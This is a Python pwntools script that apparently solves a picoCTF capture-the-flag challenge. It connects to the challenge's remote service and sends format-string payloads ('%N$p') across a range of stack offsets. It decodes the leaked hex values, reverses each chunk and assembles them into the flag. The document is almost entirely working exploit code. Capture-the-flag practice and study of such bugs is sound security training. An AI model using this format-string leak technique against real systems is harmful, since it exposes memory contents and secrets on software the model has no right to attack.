#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = 'mercury.picoctf.net', 33411


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(15, 29): # Range is obtained by fuzzing locally 
    try:
        io = remote(host, port)
        # io = process()
        io.recvlines(5)
        io.sendline(b'1')
        io.sendlineafter(b'?', f'%{i}$p'.encode())
        io.recvuntil(b':\n')
        leak = io.recvuntil(b'\n').strip()

        if not b'(nil)' in leak:
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                hexform = unhex(leak.split()[0][2:].decode())
                flag += hexform.decode()[::-1]
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')